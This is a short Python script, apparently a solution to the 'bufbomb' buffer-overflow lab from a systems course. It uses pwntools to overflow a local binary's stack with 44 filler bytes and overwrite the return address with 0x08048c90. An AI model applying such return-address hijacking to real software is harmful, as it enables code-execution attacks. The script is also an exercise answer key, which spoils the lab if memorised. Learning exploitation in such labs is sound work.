from pwn import *

f = open("./ID", "r")
id = f.read()
f.close()

sh = process(['./bufbomb', '-u', id])

ret = 0x08048c90

exploit = flat(['a' * 44, ret])

sh.sendline(exploit)

sh.interactive()
